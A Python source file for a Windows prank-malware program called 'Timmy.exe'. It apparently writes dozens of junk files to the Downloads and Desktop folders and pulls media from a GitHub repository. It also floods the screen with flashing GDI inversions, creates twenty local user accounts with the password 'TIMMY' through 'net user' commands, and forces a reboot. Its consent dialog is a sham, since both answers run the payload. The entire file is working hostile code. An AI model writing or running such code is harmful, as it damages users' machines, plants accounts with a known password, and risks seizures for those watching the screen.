from logging import root
import random
import time
import tkinter as tk
from tkinter import messagebox
import playsound3
from playsound3 import playsound
import urllib.request
import ctypes as c
import os
import threading
from PIL import Image, ImageTk
import subprocess
img_url ="https://raw.githubusercontent.com/gaers-svg/timmy.exe/refs/heads/main/TLAB-278.jpg"
sound_url = "https://github.com/gaers-svg/timmy.exe/raw/refs/heads/main/nicecomputer.mp3"
sound_url2 = "https://github.com/gaers-svg/timmy.exe/raw/refs/heads/main/fefefeffeeffefefefefeeffef.wav"
desktop = os.path.join(os.path.expanduser("~"), "Downloads")

for i in range(100):
    with open(f"{desktop}\\TIMMY_WAS_HERE{i}.txt", "w") as f:
        f.write("TIMMY WAS HERE")
def begin():
    threading.Thread(target=timmy, daemon=True).start()
    threading.Thread(target=playsound(sound_url), daemon=True).start()
    res = messagebox.askyesno("question", "give computer to timmy?")
    if res:
        messagebox.showerror("timmy", "trick question: i already have control of your computer lolOLOLOlolOlolO")
        messagebox.showerror("timmy", "ok time to die now")
        file()
        threading.Thread(target=keef, daemon=True).start()
        time.sleep(8.80)
        for i in range(100):
            gdi()
            gdi2()
        for i in range(100):
            gdi3()
            gdi4()
        for i in range(100):
            gdi3()
            gdi4()
            gdi()
            gdi2()
        for i in range(20):
            username = f"TIMMY{i}"
            subprocess.run(["net", "user", username, "TIMMY", "/add"])

        os.system("shutdown /r /t 1")
        
    else:
        messagebox.showerror("timmy", "trick question: i already have control of your computer lolOLOLOlolOlolO")
        messagebox.showerror("timmy", "ok time to die now")
        threading.Thread(target=keef, daemon=True).start()
        time.sleep(8.80)
        for i in range(100):
            gdi()
            gdi2()
        for i in range(100):
            gdi3()
            gdi4()
        for i in range(100):
            gdi3()
            gdi4()
            gdi()
            gdi2()
        for i in range(20):
            username = f"TIMMY{i}"
            subprocess.run(["net", "user", username, "TIMMY", "/add"])

        os.system("shutdown /r /t 1")
def sound2():
    playsound(sound_url)


def file():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")

    for i in range(100):
        with open(f"{desktop}\\TIMMY_WAS_HERE{i}.txt", "w") as f:
            f.write("TIMMY WAS HERE")


def timmy():
    img_path, _ = urllib.request.urlretrieve(img_url)
    root = tk.Tk()
    root.geometry("400x400")
    root.title("TLAB-278")

    img = Image.open(img_path)
    img = img.resize((400, 400))
    img = ImageTk.PhotoImage(img)

    label = tk.Label(root, image=img)
    label.image = img
    label.pack()
    root.mainloop()

user32 = c.windll.user32
g = c.windll.gdi32
g.StretchBlt
d = user32.GetDC(0)
w = user32.GetSystemMetrics(0)
h = user32.GetSystemMetrics(1)

def keef():
    playsound(sound_url2)

def gdi2():
    g.StretchBlt(
        d,          # destination DC (screen)
        0, 0,       # destination position
        w, h,       # destination size

        d,          # source DC (screen)
        0, 0,       # source position
        w-random.randint(0, w), h-200,       # source size

        0x00550009  # invert source pixels
    )

def gdi3():
    g.StretchBlt(
        d,          # destination DC (screen)
        random.randint(0, w), random.randint(0, h),       # destination position
        w, h,       # destination size

        d,          # source DC (screen)
        0, 0,       # source position
        w+100, h+100,       # source size

        0x00CC0020  # invert source pixels
    )

def gdi():
    g.StretchBlt(
        d,          # destination DC (screen)
        55, 55,       # destination position
        w, h,       # destination size

        d,          # source DC (screen)
        0, 0,       # source position
        w-random.randint(0, w), h-200,       # source size

        0x00CC0020  # SRCCOPY
    )

def gdi4():
    g.StretchBlt(
        d,          # destination DC (screen)
        random.randint(0, w), random.randint(0, h),       # destination position
        w, h,       # destination size

        d,          # source DC (screen)
        0, 0,       # source position
        w+100, h+100,       # source size

        0x00550009  # invert source pixels
    )

def warning():
    response = messagebox.askyesno("Warning","Timmy.exe is no joke. Timmy.exe can easily beat up your computer. Also, you will take note that I am not responsible for any damages caused, and I am also not responsible for anyone getting a seizure. Do you want to continue? *This is your only warning*")
    if response:
        print("bro is cooked")
        begin()
    else:
        print("bro clicked no")
warning()
